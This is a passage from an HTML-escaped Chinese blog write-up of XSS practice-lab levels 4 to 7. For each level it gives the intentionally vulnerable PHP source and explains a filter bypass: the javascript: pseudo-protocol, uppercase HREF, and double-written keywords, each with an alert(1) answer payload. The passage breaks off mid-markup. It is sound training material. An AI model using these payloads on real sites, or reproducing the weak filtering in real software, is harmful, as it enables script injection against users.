class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level4.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level4.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 5&lt;&#x2F;p&gt;
&lt;p&gt;本题在先前基础上过滤了关键字 on ，使得所有带on的方法都不可使用，故使用伪协议构造&lt;a href&#x3D;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;若过滤是被替换为空，则可进行双写绕过，若是增加下划线等破坏原有结构则需使用其他方法绕过&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;e51d1669fc381c1c00e22113b0f8bea.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;e51d1669fc381c1c00e22113b0f8bea.png&quot; alt&#x3D;&quot;e51d1669fc381c1c00e22113b0f8bea&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot;&gt;&lt;a href&#x3D;&quot;[javascript:alert(1)](about:blank)&quot;&gt;123&lt;&#x2F;a&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;，其中&#x2F;&#x2F;为注释后面的内容&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level5.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level5.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 6&lt;&#x2F;p&gt;
&lt;p&gt;本题用增加下划线的方式过滤href标签，可采用大小写绕过&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202153331833.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202153331833.png&quot; alt&#x3D;&quot;image-20240202153331833&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案&lt;code&gt;&quot;&gt;&lt;a HREF&#x3D;&quot;javascript:alert(1)&quot;&gt;1&lt;&#x2F;a&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;sr_c&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;da_ta&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;hr_ef&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level6.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level6.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 7&lt;&#x2F;p&gt;
&lt;p&gt;本题以删除的方式过滤了href和script，可以使用双写绕过&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154250121.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154250121.png&quot; alt&#x3D;&quot;image-20240202154250121&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot;&gt;&lt;a HRHREFEF&#x3D;&quot;javascrscriptipt:alert(1)&quot;&gt;1&lt;&#x2F;a&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span 